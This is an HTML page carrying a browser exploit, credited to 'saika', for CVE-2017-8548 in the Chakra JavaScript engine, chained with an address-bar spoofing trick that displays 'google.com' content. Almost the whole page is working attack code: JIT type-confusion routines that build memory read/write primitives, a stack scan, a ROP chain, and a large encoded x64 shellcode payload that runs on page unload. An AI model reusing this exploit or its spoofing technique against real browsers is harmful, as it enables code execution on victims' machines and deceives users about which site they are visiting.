<!DOCTYPE html>
<META http-equiv="Expires" content="-1"> 
<META http-equiv="Pragma" content="no-cache"> 
<META http-equiv="Cache-Control" content="No-Cache"> 
<script src='./long.min.js'></script>
<script src='./bignumber.min.js'></script>
<script>
window.onunload = function()
{
   document.execCommand("stop");
   document.write('<script> document.title="google.com :)" </\script>');
   document.write('<h1>Trust me, we are on google!</h1><h3>CVE-2017-8548 MSRC-39160 + something more</h3><div id="log"></div>');
   pwn();
}
function pwn(){
    let Long = dcodeIO.Long;

    function control(addr){
        function func(a, b, c) {
            a[0] = 1.2; //JIT assume a[0] is float but we change to var array with ValueOf helperCall
            b[0] = c;   //check failure and bypass bailout
            //a[1] = 2.2;
            a[0] = addr;
        }

        var a = [1.1, 2.2]; //lead boundery check failure in JIT
        var b = new Uint32Array(0);

        for (var i = 0; i < 0x10000; i++)
            func(a, b, i);

        func(a, b, {valueOf: () => {
            a[0] = fake;
            return 0;
        }});

        vector = a[0];
    }

    function leak(a, ta){
        function func(a, b, c) {
            a[0] = 1.2;
            b[0] = c;
            let [hi, lo] = [a[1],a[0]]; //leak fake object
            return [hi, lo];
        }

        var b = new Uint32Array(0);

        for (var i = 0; i < 0x10000; i++)
            func(a, b, i);

        let [hi, lo] = func(a, b, {valueOf: () => {
            a[0] = ta;
            return 0;
        }});

        return readfloatToint(lo);
    }

    function setFakeObj(hi, lo){
        /*
        DataView Structure
        vtable type* 0 0 buflen isDetached buf*
        */
        // vtable
        fake[1] = 0;
        fake[0] = 0x38;
        // type*
        fake[3] = hi;
        fake[2] = lo;
        // 0
        fake[5] = 0;
        fake[4] = 0;
        // 0
        fake[7] = 0;
        fake[6] = 0;
        // length
        fake[9] = 0;
        fake[8] = 0x3137;
        // isDetached
        fake[11] = hi;
        fake[10] = (lo - 0x58 + 0x30)|0;
        // buf*
        fake[15] = hi;
        fake[14] = lo;
    }

    let fake = new Array(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
    let fdv = new DataView(new ArrayBuffer(8));

    plog('############ STAGE 1 ############')
    var a = [1.1, 2.2];
    let fakeaddr = Long.fromNumber(leak(a, fake),true); //leak fake arr ptr
    plog('[+] fake : 0x' + fakeaddr.toString(16));
    
    let [hi, lo] = [fakeaddr.getHighBitsUnsigned(), (fakeaddr.getLowBitsUnsigned()+0x58)|0]; //point fake dataview directly in fake arr
    setFakeObj(hi,lo);
    let vector;
    let addr = toDouble(p64(hi,lo));
    control(addr); // get power

    let vtable = Read64(p64(hi,lo-0x58));
    plog('[+] vtable : 0x'+vtable.toString(16)); 
    
    let chakra = vtable.sub(0x5938d8); //0x5938d8 0x274c40
    let chakralimit = chakra.add(8175616);

    plog('[+] chakra : 0x'+chakra.toString(16));
    plog('[+] chakralimit : 0x'+chakralimit.toString(16));
    
    let threadContext = Read64(chakra.add(0x735ea8)); //chakra!ThreadContext::globalListLast 
    let stacklimit = Read64(Read64(threadContext.add(0x390)));
    let stackbase = stacklimit.sub(0xc000).add(10*1024*1024); //get stackbase from limit

    plog('[+] stack range : 0x' + stacklimit.toString(16) + ' ~ ' + stackbase.toString(16));

    let target = chakra.add(0x1ab8b6);
    //let target2 = chakra.add(0x13d873);
    //chakra!Js::JavascriptFunction::CallRootFunction+0x4a 0x1ab8b6 chakra!MemProtectHeapRootAlloc+0xbb
    plog('[+] chakra!Js::JavascriptFunction::CallRootFunction+0x4a : 0x'+target.toString(16));
    let ret;
    var stackaddr;
    let tl = [];
    for (var i = 8; i < 32 * 1024; i += 8){
        stackaddr = stackbase.sub(i);
        var val = Read64(stackaddr);

        if (chakralimit > val && chakra < val){
            // plog('Found ' + val.toString(16));
            tl.push(stackaddr);
        }
        if (val.equals(target)){
            ret = stackaddr;
            break;
        }
    }
    plog('[*] Found retn : ' + tl.length);
    if (ret == undefined){
        if( 0 < tl.length ){
            plog('[!] get target addr failed but try overwrite all of chakra returns')
            for (var i = 0; i < tl.length; ++i ){
                ret = tl[i];
                Write64(ret,new Long(0x14141414,0x00000414,true));  
            }             
        }else{
            plog('<h3>[!] get return addr failed.</h3>');
            return false;
        }
    }
    plog('[*] Matched. CallRootFunction in 0x' + ret.toString(16));

    plog('############ STAGE 2 ############')

    var sc = unescape("%u8148%u80ec%u0001%u4c00%u848d%u6824%u0001%u4800%u158d%u05e5%u0000%u8d48%ub50d%u0005%ue800%u041a%u0000%u8b4c%u248c%u0168%u0000%u8d4c%u2484%u0170%u0000%u8d48%ub315%u0005%u4800%u0d8d%u0592%u0000%uf7e8%u0003%u4800%u0d8d%u0586%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%uab15%u0005%uff00%u2494%u0170%u0000%u8948%u2484%u0108%u0000%u8d48%u5f0d%u0005%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u055b%u0000%u94ff%u7024%u0001%u4800%u8489%u1024%u0001%u4800%u0d8d%u0574%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%u6e15%u0005%uff00%u2494%u0170%u0000%u8948%u2484%u0118%u0000%u8d48%u4d0d%u0005%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u055a%u0000%u94ff%u7024%u0001%u4800%u8489%u2024%u0001%u4800%u0d8d%u0526%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%u4315%u0005%uff00%u2494%u0170%u0000%u8948%u2484%u0128%u0000%u8d48%uff0d%u0004%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u0529%u0000%u94ff%u7024%u0001%u4800%u8489%u3024%u0001%u4800%u0d8d%u04d8%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%u0d15%u0005%uff00%u2494%u0170%u0000%u8948%u2484%u0138%u0000%u8d48%ub10d%u0004%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u04f8%u0000%u94ff%u7024%u0001%u4800%u8489%u4024%u0001%u4800%u0d8d%u048a%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%udd15%u0004%uff00%u2494%u0170%u0000%u8948%u2484%u0148%u0000%u8d48%u630d%u0004%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u04c7%u0000%u94ff%u7024%u0001%u4800%u8489%u5024%u0001%u4800%u0d8d%u043c%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%ub115%u0004%uff00%u2494%u0170%u0000%u8948%u2484%u0158%u0000%u8d48%u150d%u0004%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u0494%u0000%u94ff%u7024%u0001%u4800%u8489%u6024%u0001%uff00%u2494%u0160%u0000%uc748%u2444%u0058%u0000%u4800%u44c7%u5024%u0000%u0000%uc748%u2444%u0048%u0000%u4800%u4489%u4024%uc748%u2444%ue038%u0001%u4800%u44c7%u3024%u0280%u0000%uc748%u2444%u0028%u0000%u4800%u44c7%u2024%u0000%u0000%ub941%u0000%u40cf%u8d4c%u4505%u0004%u4800%u158d%u0437%u0000%u00b9%u0002%uff00%u2494%u0120%u0000%u8948%u48c3%ud989%u94ff%u2824%u0001%uba00%u0001%u0000%u8948%uffd9%u2494%u0130%u0000%ub841%u4141%u4141%uc748%uf4c2%uffff%u48ff%ud989%u94ff%u3824%u0001%uba00%u0001%u0000%u8948%uffd9%u2494%u0118%u0000%u64b9%u0000%uff00%u2494%u0108%u0000%u94ff%u6024%u0001%uba00%u0001%u0000%u8948%uffc1%u2494%u0118%u0000%uc748%u2444%u0028%u0000%u4800%u44c7%u2024%u0000%u0000%u8949%u4ce1%u058d%u0050%u0000%u00ba%u0000%ub900%u0000%u0000%u94ff%u1024%u0001%u4100%u00b9%u0000%u4100%u00b8%u0000%uba00%u0000%u0000%u8d48%u244c%uff60%u2494%u0140%u0000%u8d48%u244c%uff60%u2494%u0148%u0000%u8d48%u244c%uff60%u2494%u0150%u0000%uc9eb%u8148%u78c4%u0001%uc300%u8348%u50ec%u5657%u8948%ub9cf%u01f4%u0000%u97ff%u0108%u0000%u44c7%u2024%u0001%u0000%uc766%u2444%u002a%uc700%u2444%u0030%u0000%u4800%u44c7%u3824%u0000%u0000%uc766%u2444%u1228%uc700%u2444%u002c%u0000%u4100%u28b8%u0000%u4800%u548d%u2024%u01b9%u0000%uff00%u5897%u0001%ube00%u0014%u0000%uc766%u2444%u1b28%uc700%u2444%u002c%u0000%u4100%u28b8%u0000%u4800%u548d%u2024%u01b9%u0000%uff00%u5897%u0001%u6600%u44c7%u2824%u001b%u44c7%u2c24%u0002%u0000%ub841%u0028%u0000%u8d48%u2454%ub920%u0001%u0000%u97ff%u0158%u0000%u64b9%u0000%uff00%u0897%u0001%u4800%uee83%u7501%u66a5%u44c7%u2824%u0012%u44c7%u2c24%u0002%u0000%ub841%u0028%u0000%u8d48%u2454%ub920%u0001%u0000%u97ff%u0158%u0000%u3148%u5ec0%u485f%uc483%uc330%u8148%u48ec%u0002%u4800%u9c89%u0824%u0001%u4800%uac89%u1024%u0001%u4800%ubc89%u1824%u0001%u4800%ub489%u2024%u0001%u4c00%ua489%u2824%u0001%u4c00%uac89%u3024%u0001%u4c00%ub489%u3824%u0001%u4c00%ubc89%u4024%u0001%u6500%u8b4c%u251c%u0060%u0000%u8b4d%u185b%u8d4d%u105b%u894d%u4ddf%u1b8b%u49fc%u7b8b%u4860%uce89%u84ac%u74c0%u8a26%u8027%u61fc%u037c%uec80%u3820%u75c4%u4808%uc7ff%uff48%uebc7%u4de5%u1b8b%u394d%u75fb%u48d6%uc031%ubae9%u0000%u4900%u5b8b%u4430%u638b%u493c%udc01%u8149%u88c4%u0000%u4500%u2c8b%u4d24%ued85%u0875%u3148%ue9c0%u0097%u0000%u8d4e%u2b1c%u8b45%u2474%u4d04%uee01%u8b41%u184b%u8b45%u2053%u0149%uffda%u4dc9%u248d%u418a%u3c8b%u4824%udf01%u8948%ua6d6%u0875%u068a%uc084%u0974%uf5eb%ue5e2%u3148%uebc0%u455e%u638b%u4924%udc01%u4166%u0c8b%u454c%u638b%u491c%udc01%u8b41%u8c04%u394c%u7ce8%u4c3f%uf039%u3a73%u8d48%u1834%u8d48%u24bc%u0148%u0000%u80a4%u2e3e%ufa75%uc7a4%u4407%u4c4c%u4d00%uc689%u8d48%u248c%u0148%u0000%uff41%u4dd1%uf089%u8d48%u248c%u0148%u0000%u8948%ue9f2%ufeff%uffff%u0148%u49d8%u0089%u8b48%u249c%u0108%u0000%u8b48%u24ac%u0110%u0000%u8b48%u24bc%u0118%u0000%u8b48%u24b4%u0120%u0000%u8b4c%u24a4%u0128%u0000%u8b4c%u24ac%u0130%u0000%u8b4c%u24b4%u0138%u0000%u8b4c%u24bc%u0140%u0000%u8148%u48c4%u0002%uc300%u454b%u4e52%u4c45%u3233%u442e%u4c4c%u4300%u6572%u7461%u5465%u7268%u6165%u0064%u6547%u5074%u6f72%u4163%u6464%u6572%u7373%u4c00%u616f%u4c64%u6269%u6172%u7972%u0041%u6c53%u6565%u0070%u5355%u5245%u3233%u442e%u4c4c%u5300%u6977%u6374%u5468%u546f%u6968%u5773%u6e69%u6f64%u0077%u7243%u6165%u6574%u6957%u646e%u776f%u7845%u0041%u7055%u6164%u6574%u6957%u646e%u776f%u5300%u6f68%u5777%u6e69%u6f64%u0077%u6553%u5774%u6e69%u6f64%u4c77%u6e6f%u5067%u7274%u0057%u6547%u4d74%u7365%u6173%u6567%u0057%u7254%u6e61%u6c73%u7461%u4d65%u7365%u6173%u6567%u4400%u7369%u6170%u6374%u4d68%u7365%u6173%u6567%u0057%u6553%u646e%u6e49%u7570%u0074%u6547%u4474%u7365%u746b%u706f%u6957%u646e%u776f%u7300%u6174%u6974%u0063%u6554%u7473%u4100");
    
    var b = [1.1, 2.2];
    let scaddr = Read64(Long.fromNumber(leak(b,sc),true).add(0x20));
    plog('[+] shellcode : 0x' + scaddr.toString(16));

    let zero = p64(0,0);
    let pppr = chakra.add(0x6DC3); // pop rdi ; pop rsi ; pop rbx ; ret
    let HeapPageAllocator = chakra.add(0x1DA2CB); // Memory::HeapPageAllocator
    plog('[+] pppr : 0x' + pppr.toString(16));
    plog('[+] Memory::HeapPageAllocator : 0x' + HeapPageAllocator.toString(16));
    let gadget = [
        pppr,
        scaddr,
        p64(0,0x3137),
        p64(0,0x10),
        HeapPageAllocator,
        zero,zero,zero,zero,zero,zero,
        zero,
        zero,zero,zero,zero,zero,zero,
        zero,zero,zero,zero,zero,zero,
        scaddr
    ]
    //Write64(ret,new Long(0x14141414,0x00000414,true));  
    
    for (var i = 0; i < gadget.length; ++i){
        //plog('write gadget')
        Write64(ret.add(i * 8), gadget[i]);
    }
    plog('[!] overwrite stack complete')
    alert('pwned');
    

    /* My Utils */
    function abs(num){
        return Math.abs(num);
    }

    function d2h(num){
        if (num < 0) num = 0xffffffff + num + 1;
        return num.toString(16);
    }

    function plog(str) {
        //var o = document.getElementById("log");
        //o.innerHTML += str + "<br>";
    }

    function p64(hi, lo){
        return new Long(lo,hi,true);
    }

    /* Utility for handle bignumber */
    function Int2Array(val) {
        var res = [];
        var hexed = ('0000000000000000' + val.toString(16)).substr(-16);
        for (var i = 0; i < 16; i+=2)
            res.push(parseInt(hexed.substr(i,2), 16));
        return res;
    };

    function toDouble(val) {
        var buffer = new ArrayBuffer(8);
        var byteView = new Uint8Array(buffer);
        var view = new Float64Array(buffer);

        byteView.set(Int2Array(val).reverse());
        return view[0];
    };

    function fromDouble(val) {
        var buffer = new ArrayBuffer(8);
        var view = new Float64Array(buffer);
        view[0] = val;
        return new Uint8Array(buffer, 0, view.BYTES_PER_ELEMENT);
    };

    function readfloatToint(arg){
        var res1 = "";
        var res2 = "";
        var bytes = fromDouble(arg);
        for (var i = 0; i < (bytes.length); i++){
          res1 += ("0"+ bytes[bytes.length - 1 - i].toString(16)).substr(-2);
        }
        return parseInt(res1, 16);
    }

    /* Utility by bpak */
    function SetAddress(addr)
    {
        fake[14] = addr.low|0;
        fake[15] = addr.high|0;
    }

    function Read64(addr)
    {
        SetAddress(addr);
        return new Long(fdv.getUint32.call(vector, 0, true), fdv.getUint32.call(vector, 4, true), true);
    }

    function Write64(addr, val)
    {
        SetAddress(addr);
        fdv.setUint32.call(vector, 0, val.low|0, true);
        fdv.setUint32.call(vector, 4, val.high|0, true);
    }
}
</script>
<body>
<h1>CVE-2017-8548 + Address bar Spoofing exploit by saika</h1>
<h3>try to move google.com on url!</h3>
</body>